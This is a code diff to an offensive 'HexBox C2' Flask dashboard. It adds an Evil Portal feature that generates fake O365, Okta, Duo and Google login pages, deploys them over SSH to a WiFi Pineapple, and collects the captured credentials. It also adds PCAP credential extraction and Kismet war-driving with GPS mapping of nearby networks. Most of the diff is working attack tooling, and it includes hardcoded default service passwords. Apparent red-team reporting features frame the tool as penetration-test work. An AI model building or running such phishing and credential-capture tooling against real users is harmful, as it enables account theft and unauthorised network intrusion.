@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 4)
+# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 5)
 
 from flask import (Flask, render_template_string, request, jsonify,
                    send_file, session, redirect, Response)
@@ -36,7 +36,9 @@ _BUNNY_CFG   = _CFG.get("bashbunny") or DEVICES.get("bashbunny",
 _FLIPPER_CFG = _CFG.get("flipper", {"serial_port": "/dev/ttyACM0"})
 _BH_CFG      = _CFG.get("bloodhound", {"url": "http://localhost:8080",
                                         "username": "admin", "password": "BloodHound!"})
-_SLIVER_CFG  = _CFG.get("sliver", {"host": "127.0.0.1", "port": 31337})
+_SLIVER_CFG  = _CFG.get("sliver",  {"host": "127.0.0.1", "port": 31337})
+_KISMET_CFG  = _CFG.get("kismet",  {"url": "http://localhost:2501",
+                                     "username": "kismet", "password": "kismet"})
 
 LOOT     = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
 LOGS     = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
@@ -48,7 +50,8 @@ IFACE_RESPONDER = _IF.get("responder", "eth0")
 IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")
 
 for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
-          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny"):
+          LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny",
+          LOOT / "pcaps", LOOT / "portals", LOOT / "wardrive"):
     d.mkdir(parents=True, exist_ok=True)
 
 # ---------------------------------------------------------------------------
@@ -57,7 +60,7 @@ for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
 
 _TOKEN = os.environ.get("HEXBOX_TOKEN") or _HB.get("api_token") or secrets.token_hex(16)
 app.secret_key = secrets.token_hex(32)
-_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver"}
+_VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver", "kismet"}
 
 
 @app.before_request
@@ -345,6 +348,7 @@ tr:hover td{background:#0d0d0d}
   <button class="tab"        id="btn-loot"     onclick="showTab('loot')">&#128193; Loot</button>
   <button class="tab"        id="btn-logs"     onclick="showTab('logs')">&#128203; Logs</button>
   <button class="tab"        id="btn-report"   onclick="showTab('report')">&#x1F4CB; Report</button>
+  <button class="tab"        id="btn-wardrive" onclick="showTab('wardrive')">&#x1F4F6; War-Drive</button>
 </div>
 
 <!-- ========================= DEVICES TAB ========================= -->
@@ -499,6 +503,25 @@ tr:hover td{background:#0d0d0d}
   <span id="bh-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
 </div>
 <div id="intel-bloodhound"><span style="color:#333">Click Refresh to load BloodHound data...</span></div>
+
+<div class="sec">&#x1F4E6; PCAP Analysis</div>
+<div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
+  <label>File:</label>
+  <select id="pcap-sel" style="flex:1;min-width:180px"><option value="">— select PCAP —</option></select>
+  <button onclick="loadPcapList()" class="dim">&#x21BA; Refresh</button>
+  <button onclick="analyzePcap()" class="warn">&#x1F50D; Analyze</button>
+  <span id="pcap-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="pcap-protocols" style="margin-bottom:6px"></div>
+<div id="pcap-creds"><span style="color:#333">Select a PCAP and click Analyze...</span></div>
+<div id="pcap-dns" style="margin-top:6px"></div>
+
+<div class="sec">&#x1F3AD; Portal Credentials</div>
+<div class="row" style="border:none;padding:4px 0">
+  <button onclick="refreshPortalCreds()" class="dim">&#x21BA; Refresh</button>
+  <span id="portal-cred-count" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="intel-portal-creds"><span style="color:#333">Click Refresh to load portal captures...</span></div>
 </div><!-- /pane-intel -->
 
 <!-- ========================= PAYLOADS TAB ========================= -->
@@ -531,6 +554,31 @@ tr:hover td{background:#0d0d0d}
 
 <div class="sec">Available Payloads</div>
 <div id="payload-list"><span style="color:#333">Loading...</span></div>
+
+<div class="bar" style="margin-top:8px">
+  <h3>&#x1F3AD; Evil Portal</h3>
+  <div class="row" style="border:none;padding:4px 0;flex-wrap:wrap">
+    <label>Template:</label>
+    <select id="portal-type">
+      <option value="o365">Microsoft O365</option>
+      <option value="okta">Okta</option>
+      <option value="duo">Duo Security</option>
+      <option value="google">Google</option>
+    </select>
+    <label>Catcher IP:</label>
+    <input id="portal-ip" value="{{hexbox_ip}}" style="width:120px">
+    <label>Port:</label>
+    <input id="portal-port" value="8000" style="width:60px">
+    <label>Redirect:</label>
+    <input id="portal-redirect" placeholder="(auto)" style="width:180px">
+  </div>
+  <div style="margin-top:4px;display:flex;gap:6px;flex-wrap:wrap">
+    <button onclick="previewPortal()">&#x1F441; Preview</button>
+    <button onclick="downloadPortal()" class="dim">&#x2B07; Download</button>
+    <button onclick="deployPortalToPineapple()" class="warn">&#x26A1; Deploy to Pineapple</button>
+  </div>
+  <div id="portal-msg" style="color:#555;font-size:.78em;margin-top:4px"></div>
+</div>
 </div><!-- /pane-payloads -->
 
 <!-- ========================= LOOT TAB ========================= -->
@@ -587,6 +635,49 @@ tr:hover td{background:#0d0d0d}
 <div id="report-stats" style="margin:10px 0"></div>
 <div id="report-msg" style="color:#555;font-size:.82em">Configure the engagement details above and click Generate.</div>
 </div><!-- /pane-report -->
+
+<!-- ========================= WAR-DRIVE TAB ========================= -->
+<div id="pane-wardrive" style="display:none">
+
+<div class="row">
+  <span class="dot" id="dot-kismet" title="Kismet"></span>
+  <button onclick="run('/kismet/start')">&#x25B6; Start Kismet</button>
+  <button onclick="stopProc('kismet')" class="kill">&#x25A0; Stop</button>
+  <button onclick="refreshWardrive()">&#x21BA; Refresh</button>
+  <button onclick="exportWardrive('csv')" class="dim">&#x2B07; CSV</button>
+  <button onclick="exportWardrive('kml')" class="dim">&#x2B07; KML</button>
+  <span id="kismet-status" style="color:#555;font-size:.78em;margin-left:6px"></span>
+</div>
+
+<div class="bar">
+  <h3>&#x1F4CD; GPS Position</h3>
+  <div id="gps-pos" style="font-family:monospace;color:#0f0;font-size:.85em">No GPS fix</div>
+</div>
+
+<div class="bar">
+  <h3>&#x1F4F6; Discovered Networks <span id="net-count" style="color:#555;font-size:.8em"></span></h3>
+  <div style="display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap">
+    <input id="wd-filter" placeholder="Filter SSID / BSSID..." style="flex:1;min-width:160px"
+           oninput="filterNetworks()">
+    <label><input type="checkbox" id="wd-gps-only" onchange="filterNetworks()"> GPS only</label>
+    <label><input type="checkbox" id="wd-open-only" onchange="filterNetworks()"> Open only</label>
+  </div>
+  <div style="overflow-x:auto">
+    <table id="wd-table">
+      <tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th><th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>
+    </table>
+  </div>
+</div>
+
+<div class="bar">
+  <h3>&#x1F5FA; Coverage Map <span style="color:#333;font-size:.75em">(requires internet for tiles)</span></h3>
+  <div id="wd-map" style="height:320px;border:1px solid #1a1a1a;background:#0a0a0a;
+       display:flex;align-items:center;justify-content:center;color:#333;font-size:.82em">
+    Map loads after networks are fetched
+  </div>
+</div>
+
+</div><!-- /pane-wardrive -->
 
 <!-- ========================= ENGAGEMENT MODAL ========================= -->
 <div id="eng-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;
@@ -664,17 +755,18 @@ function initSSE() {
 }
 
 // ---- Tab switching ----
-const ALL_TABS = ['devices','intel','payloads','loot','logs','report'];
+const ALL_TABS = ['devices','intel','payloads','loot','logs','report','wardrive'];
 function showTab(name) {
   ALL_TABS.forEach(t => {
     document.getElementById('pane-'+t).style.display = t===name ? '' : 'none';
     document.getElementById('btn-'+t).classList.toggle('active', t===name);
   });
-  if (name==='intel')    { refreshIntel(); refreshBH(); }
+  if (name==='intel')    { refreshIntel(); refreshBH(); loadPcapList(); refreshPortalCreds(); }
   if (name==='loot')     refreshLoot();
   if (name==='logs')     tailLog();
-  if (name==='payloads') loadPayloadList();
+  if (name==='payloads') { loadPayloadList(); }
   if (name==='report')   loadReportStats();
+  if (name==='wardrive') refreshWardrive();
 }
 
 // ---- Device helpers ----
@@ -1079,6 +1171,251 @@ async function restartC2() {
     toast('Restarting — reload in a few seconds...', 'warn');
     setTimeout(() => location.reload(), 4000);
   }
+}
+
+// ---- Evil Portal ----
+async function previewPortal() {
+  const type  = document.getElementById('portal-type').value;
+  const ip    = document.getElementById('portal-ip').value.trim();
+  const port  = document.getElementById('portal-port').value.trim();
+  const redir = document.getElementById('portal-redirect').value.trim();
+  const msg   = document.getElementById('portal-msg');
+  msg.textContent = 'Loading preview...';
+  try {
+    const r = await fetch(`/portal/preview?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`);
+    if (!r.ok) { msg.textContent='[ERR] '+r.statusText; return; }
+    const html = await r.text();
+    const w = window.open('', '_blank');
+    w.document.write(html);
+    w.document.close();
+    msg.textContent = `Previewing ${type} portal`;
+  } catch(e) { msg.textContent='[ERR] '+e; }
+}
+
+async function downloadPortal() {
+  const type  = document.getElementById('portal-type').value;
+  const ip    = document.getElementById('portal-ip').value.trim();
+  const port  = document.getElementById('portal-port').value.trim();
+  const redir = document.getElementById('portal-redirect').value.trim();
+  window.location.href = `/portal/download?type=${type}&ip=${encodeURIComponent(ip)}&port=${port}&redirect=${encodeURIComponent(redir)}`;
+}
+
+async function deployPortalToPineapple() {
+  const type = document.getElementById('portal-type').value;
+  const ip   = document.getElementById('portal-ip').value.trim();
+  const port = document.getElementById('portal-port').value.trim();
+  const redir= document.getElementById('portal-redirect').value.trim();
+  const msg  = document.getElementById('portal-msg');
+  msg.textContent = 'Deploying to Pineapple...';
+  try {
+    const r = await fetch('/portal/deploy', {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({type, ip, port, redirect: redir})});
+    const j = await r.json();
+    msg.textContent = j.output || j.error || '';
+    if (j.error) toast(j.error, 'err'); else toast('Portal deployed: '+type, 'warn');
+  } catch(e) { msg.textContent='[ERR] '+e; }
+}
+
+// ---- PCAP Analysis ----
+async function loadPcapList() {
+  const sel = document.getElementById('pcap-sel');
+  try {
+    const j = await (await fetch('/pcap/list')).json();
+    sel.innerHTML = '<option value="">— select PCAP —</option>' +
+      j.files.map(f => `<option value="${esc(f.name)}">${esc(f.name)} (${f.size_kb} KB)</option>`).join('');
+  } catch(_) {}
+}
+
+async function analyzePcap() {
+  const name = document.getElementById('pcap-sel').value;
+  if (!name) { toast('Select a PCAP file first','warn'); return; }
+  const st   = document.getElementById('pcap-status');
+  const cDiv = document.getElementById('pcap-creds');
+  const pDiv = document.getElementById('pcap-protocols');
+  const dDiv = document.getElementById('pcap-dns');
+  st.textContent = 'Analyzing...';
+  cDiv.innerHTML = '<span style="color:#555">Running tshark...</span>';
+  try {
+    const r = await fetch('/pcap/analyze?name='+encodeURIComponent(name));
+    const j = await r.json();
+    if (j.error) { st.textContent=j.error; cDiv.textContent=''; return; }
+    st.textContent = `${j.stats.packet_count||0} pkts, ${j.stats.bytes_kb||0} KB, ${j.stats.duration_sec||0}s`;
+
+    // Protocol bars
+    const protos = Object.entries(j.protocols||{}).sort((a,b)=>b[1]-a[1]).slice(0,12);
+    const maxP = protos[0]?.[1] || 1;
+    pDiv.innerHTML = '<div style="display:flex;flex-wrap:wrap;gap:4px 12px;margin-bottom:6px">' +
+      protos.map(([p,n]) =>
+        `<span style="font-size:.75em;color:#555">${esc(p)}: <b style="color:#0f0">${n}</b></span>`
+      ).join('') + '</div>';
+
+    // Credentials
+    if (j.credentials?.length) {
+      cDiv.innerHTML = '<div class="sec" style="margin:4px 0">Captured Credentials</div>' +
+        '<table><tr><th>Type</th><th>Src IP</th><th>Host</th><th>User</th><th>Password</th></tr>' +
+        j.credentials.map(c =>
+          `<tr><td><span class="badge">${esc(c.type)}</span></td>` +
+          `<td>${esc(c.src_ip)}</td><td>${esc(c.host)}</td>` +
+          `<td style="color:#0f0">${esc(c.username||'?')}</td>` +
+          `<td style="color:#c00">${esc(c.password||c.hash||'?')}</td></tr>`
+        ).join('') + '</table>';
+    } else {
+      cDiv.innerHTML = '<span style="color:#333;font-size:.8em">No cleartext credentials found in PCAP</span>';
+    }
+
+    // DNS
+    if (j.dns_queries?.length) {
+      const top20 = j.dns_queries.slice(0,20);
+      dDiv.innerHTML = '<div class="sec" style="margin:4px 0">DNS Queries (top 20)</div>' +
+        '<div style="display:flex;flex-wrap:wrap;gap:4px">' +
+        top20.map(d => `<span style="font-size:.72em;color:#555;border:1px solid #111;padding:1px 5px">${esc(d.query)}</span>`).join('') +
+        '</div>';
+    } else { dDiv.innerHTML = ''; }
+  } catch(e) { st.textContent='[ERR] '+e; cDiv.textContent=''; }
+}
+
+// ---- Portal Credentials ----
+async function refreshPortalCreds() {
+  const el = document.getElementById('intel-portal-creds');
+  const ct = document.getElementById('portal-cred-count');
+  try {
+    const j = await (await fetch('/portal/credentials')).json();
+    ct.textContent = j.credentials.length + ' capture(s)';
+    if (!j.credentials.length) {
+      el.innerHTML='<span style="color:#333">No portal credentials captured yet — deploy a portal first</span>'; return;
+    }
+    el.innerHTML = '<table><tr><th>Time</th><th>Portal</th><th>Host/IP</th><th>Username</th><th>Password</th></tr>' +
+      j.credentials.map(c =>
+        `<tr><td style="color:#555">${esc(c.ts)}</td><td><span class="badge">${esc(c.portal)}</span></td>` +
+        `<td>${esc(c.host)}</td><td style="color:#0f0"><b>${esc(c.username)}</b></td>` +
+        `<td style="color:#c00">${esc(c.password)}</td></tr>`
+      ).join('') + '</table>';
+  } catch(e) { el.innerHTML='[ERR] '+e; }
+}
+
+// ---- War-Drive / Kismet ----
+let _wdNetworks = [];
+
+async function refreshWardrive() {
+  const st = document.getElementById('kismet-status');
+  const dot = document.getElementById('dot-kismet');
+  st.textContent = 'Checking...';
+  try {
+    const j = await (await fetch('/kismet/status')).json();
+    dot.className = 'dot ' + (j.running ? 'up' : 'dn');
+    st.textContent = j.running
+      ? `Kismet running — ${j.device_count||0} devices seen`
+      : (j.installed ? 'Installed — not running' : 'Not installed (apt install kismet)');
+    if (j.running) { fetchNetworks(); fetchGps(); }
+  } catch(e) { dot.className='dot dn'; st.textContent='[ERR] '+e; }
+}
+
+async function fetchGps() {
+  try {
+    const j = await (await fetch('/kismet/gps')).json();
+    const el = document.getElementById('gps-pos');
+    if (j.lat && j.lon) {
+      el.textContent = `Lat: ${j.lat.toFixed(6)}  Lon: ${j.lon.toFixed(6)}  Alt: ${(j.alt||0).toFixed(1)}m  Fix: ${j.fix||'?'}`;
+      el.style.color = '#0f0';
+    } else {
+      el.textContent = 'No GPS fix — connect GPS receiver or start gpsd';
+      el.style.color = '#555';
+    }
+  } catch(_) {}
+}
+
+async function fetchNetworks() {
+  try {
+    const j = await (await fetch('/kismet/networks')).json();
+    _wdNetworks = j.networks || [];
+    document.getElementById('net-count').textContent = `(${_wdNetworks.length})`;
+    renderNetworkTable(_wdNetworks);
+    renderMap(_wdNetworks);
+  } catch(e) { console.error(e); }
+}
+
+function filterNetworks() {
+  const q       = document.getElementById('wd-filter').value.toLowerCase();
+  const gpsOnly = document.getElementById('wd-gps-only').checked;
+  const openOnly= document.getElementById('wd-open-only').checked;
+  const filtered = _wdNetworks.filter(n => {
+    if (q && !n.ssid.toLowerCase().includes(q) && !n.bssid.toLowerCase().includes(q)) return false;
+    if (gpsOnly && (!n.lat || !n.lon)) return false;
+    if (openOnly && n.encryption !== 'Open') return false;
+    return true;
+  });
+  renderNetworkTable(filtered);
+}
+
+function renderNetworkTable(nets) {
+  const tbl = document.getElementById('wd-table');
+  const sigColor = s => s >= -50 ? '#0f0' : s >= -70 ? '#ff0' : '#c00';
+  const encClass = e => e==='Open' ? 'enc-badge open' : 'enc-badge';
+  tbl.innerHTML = '<tr><th>SSID</th><th>BSSID</th><th>dBm</th><th>Ch</th><th>Enc</th>' +
+                  '<th>Clients</th><th>Lat</th><th>Lon</th><th>Last Seen</th></tr>' +
+    nets.map(n =>
+      `<tr><td><b>${esc(n.ssid||'(hidden)')}</b></td>` +
+      `<td style="font-size:.72em;color:#555">${esc(n.bssid)}</td>` +
+      `<td style="color:${sigColor(n.signal)}">${n.signal}</td>` +
+      `<td>${n.channel||'?'}</td>` +
+      `<td><span class="${encClass(n.encryption)}">${esc(n.encryption)}</span></td>` +
+      `<td>${n.clients||0}</td>` +
+      `<td style="font-size:.72em;color:#555">${n.lat ? n.lat.toFixed(5) : '—'}</td>` +
+      `<td style="font-size:.72em;color:#555">${n.lon ? n.lon.toFixed(5) : '—'}</td>` +
+      `<td style="font-size:.72em;color:#555">${esc(n.last_seen||'')}</td></tr>`
+    ).join('');
+}
+
+function renderMap(nets) {
+  const mapDiv = document.getElementById('wd-map');
+  const located = nets.filter(n => n.lat && n.lon);
+  if (!located.length) {
+    mapDiv.textContent = 'No GPS-tagged networks yet';
+    return;
+  }
+  // Try Leaflet (requires internet for tiles); fall back to coordinate list
+  if (typeof L === 'undefined') {
+    const script = document.createElement('script');
+    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+    script.onload = () => _buildLeafletMap(located);
+    script.onerror = () => {
+      mapDiv.innerHTML = '<span style="color:#555">Map tiles unavailable (offline). ' +
+        located.length + ' GPS-tagged networks — export KML to view in Google Earth.</span>';
+    };
+    document.head.appendChild(script);
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
+    document.head.appendChild(link);
+  } else {
+    _buildLeafletMap(located);
+  }
+}
+
+let _leafletMap = null;
+function _buildLeafletMap(nets) {
+  const mapDiv = document.getElementById('wd-map');
+  mapDiv.style.background = '';
+  if (!_leafletMap) {
+    _leafletMap = L.map('wd-map');
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+      {attribution:'© OpenStreetMap'}).addTo(_leafletMap);
+  }
+  _leafletMap.eachLayer(l => { if (l instanceof L.Marker) _leafletMap.removeLayer(l); });
+  const bounds = [];
+  nets.forEach(n => {
+    const enc = n.encryption === 'Open' ? '🔓 Open' : '🔒 '+n.encryption;
+    L.marker([n.lat, n.lon])
+      .bindPopup(`<b>${n.ssid||'(hidden)'}</b><br>${n.bssid}<br>${enc}<br>${n.signal} dBm`)
+      .addTo(_leafletMap);
+    bounds.push([n.lat, n.lon]);
+  });
+  if (bounds.length) _leafletMap.fitBounds(bounds, {padding:[20,20]});
+}
+
+async function exportWardrive(fmt) {
+  window.location.href = '/kismet/export?format='+fmt;
 }
 
 // ---- Bash Bunny ----
@@ -2229,6 +2566,362 @@ def sliver_download():
     return send_file(str(path), as_attachment=True, download_name=name)
 
 # ---------------------------------------------------------------------------
+# Routes — Evil Portal
+# ---------------------------------------------------------------------------
+
+_PORTALS_DIR = PAYLOADS / "portals"
+_PORTAL_CREDS_FILE = LOOT / "portals" / "captures.json"
+
+
+def _portal_html(ptype: str, catcher_ip: str, catcher_port: str, redirect: str) -> str | None:
+    src = _PORTALS_DIR / f"{ptype}.html"
+    if not src.exists():
+        return None
+    html = src.read_text()
+    base = f"http://{catcher_ip}:{catcher_port}"
+    html = html.replace("HEXBOX_CATCHER", base)
+    if redirect:
+        html = re.sub(r'(window\.location\.href\s*=\s*["\'])https?://[^"\']+', rf'\g<1>{redirect}', html)
+    return html
+
+
+@app.route("/portal/preview")
+def portal_preview():
+    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
+    ip    = request.args.get("ip",       HEXBOX_IP)
+    port  = request.args.get("port",     "8000")
+    redir = request.args.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return "invalid IP", 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return f"Template '{ptype}' not found", 404
+    return Response(html, mimetype="text/html")
+
+
+@app.route("/portal/download")
+def portal_download():
+    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
+    ip    = request.args.get("ip",       HEXBOX_IP)
+    port  = request.args.get("port",     "8000")
+    redir = request.args.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return "invalid IP", 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return f"Template '{ptype}' not found", 404
+    from io import BytesIO
+    return send_file(BytesIO(html.encode()), as_attachment=True,
+                     download_name=f"portal_{ptype}.html",
+                     mimetype="text/html")
+
+
+@app.route("/portal/deploy", methods=["POST"])
+def portal_deploy():
+    data  = request.get_json(silent=True) or {}
+    ptype = re.sub(r"[^a-z0-9]", "", data.get("type", "o365"))[:16]
+    ip    = data.get("ip",       HEXBOX_IP)
+    port  = str(data.get("port", "8000"))
+    redir = data.get("redirect", "")
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return jsonify(error="invalid IP"), 400
+    html = _portal_html(ptype, ip, port, redir)
+    if html is None:
+        return jsonify(error=f"Template '{ptype}' not found"), 404
+    # Deploy to Pineapple via SSH
+    try:
+        d = DEVICES["pineapple"]
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
+        sftp = c.open_sftp()
+        # Write portal HTML to Pineapple Evil Portal directory
+        remote_path = "/etc/evilportal/portal.html"
+        import io
+        sftp.putfo(io.BytesIO(html.encode()), remote_path)
+        # Enable Evil Portal module
+        _, out, err = c.exec_command(
+            "/etc/init.d/evilportal start 2>&1; evilportal start 2>&1 | head -5")
+        result = out.read().decode() + err.read().decode()
+        sftp.close()
+        c.close()
+        _log(f"Evil Portal deployed: {ptype} → Pineapple")
+        return jsonify(output=f"Deployed {ptype} portal to Pineapple → {remote_path}\n{result.strip()}")
+    except Exception as e:
+        return jsonify(error=str(e)), 500
+
+
+@app.route("/portal/credentials")
+def portal_credentials():
+    if not _PORTAL_CREDS_FILE.exists():
+        return jsonify(credentials=[])
+    try:
+        return jsonify(credentials=json.loads(_PORTAL_CREDS_FILE.read_text()))
+    except Exception:
+        return jsonify(credentials=[])
+
+# ---------------------------------------------------------------------------
+# Routes — PCAP Analysis
+# ---------------------------------------------------------------------------
+
+@app.route("/pcap/list")
+def pcap_list():
+    try:
+        from parse_pcap import list_pcaps
+    except ImportError:
+        import sys as _sys
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from parse_pcap import list_pcaps
+    return jsonify(files=list_pcaps(LOOT))
+
+
+@app.route("/pcap/analyze")
+def pcap_analyze():
+    name = _safe_name(request.args.get("name", ""), maxlen=128)
+    if not name:
+        return jsonify(error="name required"), 400
+    # Search both loot/pcaps/ and loot/pcaps subdirs
+    candidate = None
+    for d in (LOOT / "pcaps", LOOT):
+        p = d / name
+        try:
+            p.resolve().relative_to(LOOT.resolve())
+        except ValueError:
+            continue
+        if p.is_file():
+            candidate = p
+            break
+    if candidate is None:
+        return jsonify(error=f"File not found: {name}"), 404
+    try:
+        from parse_pcap import analyze_pcap
+    except ImportError:
+        import sys as _sys
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from parse_pcap import analyze_pcap
+    result = analyze_pcap(candidate)
+    _log(f"PCAP analyzed: {name} — {result.get('stats',{}).get('packet_count',0)} packets")
+    return jsonify(**result)
+
+# ---------------------------------------------------------------------------
+# Routes — War-Drive / Kismet
+# ---------------------------------------------------------------------------
+
+_WD_NETWORKS_FILE = LOOT / "wardrive" / "networks.json"
+
+
+def _kismet_req(path: str, timeout: int = 10) -> dict:
+    url  = _KISMET_CFG.get("url", "http://localhost:2501")
+    auth = (_KISMET_CFG.get("username", "kismet"),
+            _KISMET_CFG.get("password", "kismet"))
+    r = _req.get(f"{url}{path}", auth=auth, timeout=timeout)
+    r.raise_for_status()
+    return r.json()
+
+
+def _kismet_running() -> bool:
+    try:
+        _kismet_req("/system/status.json", timeout=3)
+        return True
+    except Exception:
+        return False
+
+
+@app.route("/kismet/status")
+def kismet_status():
+    installed = bool(shutil.which("kismet"))
+    running   = False
+    device_count = 0
+    with _procs_lock:
+        p = _procs.get("kismet")
+        if p and p.poll() is None:
+            running = True
+    if not running:
+        try:
+            r = subprocess.run(["pgrep", "-x", "kismet"],
+                               capture_output=True, timeout=3)
+            running = r.returncode == 0
+        except Exception:
+            pass
+    if running:
+        try:
+            st = _kismet_req("/system/status.json", timeout=3)
+            device_count = st.get("kismet.system.devices.count", 0)
+        except Exception:
+            pass
+    return jsonify(installed=installed, running=running, device_count=device_count)
+
+
+@app.route("/kismet/start", methods=["POST"])
+def kismet_start():
+    if not shutil.which("kismet"):
+        return jsonify(error="kismet not installed — sudo apt install kismet"), 400
+    iface = IFACE_BETTERCAP  # use configured wireless interface
+    pid = start_proc("kismet", [
+        "kismet", "-c", iface,
+        "--no-ncurses",
+        "--daemonize",
+    ])
+    _log(f"Kismet started (pid={pid}) on {iface}")
+    return jsonify(output=f"Kismet started (pid={pid}) on {iface} — dashboard at :2501")
+
+
+@app.route("/kismet/networks")
+def kismet_networks():
+    try:
+        # Fetch access points from Kismet API
+        data = _kismet_req(
+            "/devices/views/phydot11_accesspoints/devices.json?fields="
+            "kismet.device.base.macaddr,kismet.device.base.name,"
+            "kismet.device.base.signal/kismet.common.signal.last_signal,"
+            "kismet.device.base.channel,kismet.device.base.last_time,"
+            "dot11.device/dot11.device.last_beaconed_ssid_record/dot11.advertisedssid.ssid,"
+            "kismet.device.base.location/kismet.common.location.avg_loc,"
+            "dot11.device/dot11.device.num_associated_clients,"
+            "dot11.device/dot11.device.wpa_handshake_list",
+            timeout=15,
+        )
+    except Exception as e:
+        # Return cached data if Kismet unreachable
+        if _WD_NETWORKS_FILE.exists():
+            nets = json.loads(_WD_NETWORKS_FILE.read_text())
+            return jsonify(networks=nets, cached=True)
+        return jsonify(error=str(e), networks=[]), 502
+
+    networks = []
+    for dev in (data if isinstance(data, list) else []):
+        try:
+            bssid   = dev.get("kismet.device.base.macaddr", "?")
+            ssid    = (dev.get("dot11.device", {})
+                          .get("dot11.device.last_beaconed_ssid_record", {})
+                          .get("dot11.advertisedssid.ssid", ""))
+            signal  = (dev.get("kismet.device.base.signal", {})
+                          .get("kismet.common.signal.last_signal", -100))
+            channel = dev.get("kismet.device.base.channel", "?")
+            clients = (dev.get("dot11.device", {})
+                          .get("dot11.device.num_associated_clients", 0))
+            last_t  = dev.get("kismet.device.base.last_time", 0)
+            loc     = (dev.get("kismet.device.base.location", {})
+                          .get("kismet.common.location.avg_loc", {}))
+            lat = loc.get("kismet.common.location.lat")
+            lon = loc.get("kismet.common.location.lon")
+            alt = loc.get("kismet.common.location.alt")
+
+            # Infer encryption from SSID record if available
+            ssid_rec = (dev.get("dot11.device", {})
+                           .get("dot11.device.last_beaconed_ssid_record", {}))
+            crypt_set = ssid_rec.get("dot11.advertisedssid.crypt_set", 0)
+            if crypt_set == 0:
+                enc = "Open"
+            elif crypt_set & 0x400:
+                enc = "WPA3"
+            elif crypt_set & 0x100:
+                enc = "WPA2"
+            elif crypt_set & 0x20:
+                enc = "WPA"
+            else:
+                enc = "WEP"
+
+            networks.append({
+                "ssid":       ssid,
+                "bssid":      bssid,
+                "signal":     int(signal),
+                "channel":    str(channel),
+                "encryption": enc,
+                "clients":    int(clients),
+                "lat":        float(lat) if lat else None,
+                "lon":        float(lon) if lon else None,
+                "alt":        float(alt) if alt else None,
+                "last_seen":  datetime.fromtimestamp(last_t).strftime("%H:%M:%S") if last_t else "",
+            })
+        except Exception:
+            continue
+
+    # Persist for export/cache
+    _WD_NETWORKS_FILE.parent.mkdir(parents=True, exist_ok=True)
+    _WD_NETWORKS_FILE.write_text(json.dumps(networks, indent=2))
+    _log(f"Kismet: {len(networks)} networks fetched")
+    return jsonify(networks=networks)
+
+
+@app.route("/kismet/gps")
+def kismet_gps():
+    try:
+        data = _kismet_req("/location/location.json", timeout=5)
+        loc  = data.get("kismet.common.location.avg_loc", data)
+        return jsonify(
+            lat=loc.get("kismet.common.location.lat"),
+            lon=loc.get("kismet.common.location.lon"),
+            alt=loc.get("kismet.common.location.alt"),
+            fix=loc.get("kismet.common.location.fix", 0),
+        )
+    except Exception as e:
+        return jsonify(lat=None, lon=None, alt=None, fix=0, error=str(e))
+
+
+@app.route("/kismet/export")
+def kismet_export():
+    fmt = request.args.get("format", "csv")
+    nets: list[dict] = []
+    if _WD_NETWORKS_FILE.exists():
+        nets = json.loads(_WD_NETWORKS_FILE.read_text())
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    if fmt == "csv":
+        import io as _io
+        buf = _io.StringIO()
+        buf.write("SSID,BSSID,Signal,Channel,Encryption,Clients,Lat,Lon,LastSeen\n")
+        for n in nets:
+            buf.write(",".join([
+                f'"{n.get("ssid","")}"',
+                n.get("bssid",""),
+                str(n.get("signal","")),
+                str(n.get("channel","")),
+                n.get("encryption",""),
+                str(n.get("clients",0)),
+                str(n.get("lat","") or ""),
+                str(n.get("lon","") or ""),
+                f'"{n.get("last_seen","")}"',
+            ]) + "\n")
+        from io import BytesIO
+        return send_file(BytesIO(buf.getvalue().encode()),
+                         as_attachment=True,
+                         download_name=f"wardrive_{ts}.csv",
+                         mimetype="text/csv")
+
+    if fmt == "kml":
+        lines = ['<?xml version="1.0" encoding="UTF-8"?>',
+                 '<kml xmlns="http://www.opengis.net/kml/2.2"><Document>',
+                 f'<name>HexBox War-Drive {ts}</name>']
+        for n in nets:
+            if not n.get("lat") or not n.get("lon"):
+                continue
+            enc = n.get("encryption","?")
